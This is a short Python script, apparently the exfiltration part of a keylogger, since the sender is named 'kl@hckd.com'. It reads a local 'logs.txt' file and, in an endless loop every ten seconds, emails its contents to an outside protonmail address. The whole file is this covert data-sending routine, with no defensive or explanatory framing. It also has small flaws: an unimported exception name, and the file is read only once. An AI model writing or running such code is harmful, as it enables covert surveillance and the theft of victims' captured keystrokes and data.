import smtplib
import time

sender = "kl@hckd.com"

receivers = ['shalimarbaghouse@protonmail.com']

f = open("logs.txt", "r")

message = (f.read())

def executeSomething():
    try:
        smtpObj = smtplib.SMTP('localhost', 25)
        smtpObj.sendmail(sender, receivers, message)
        print("Sent!")
    except SMTPException:
        print("Error: unable to send email")

    time.sleep(10)

while True:
    executeSomething()
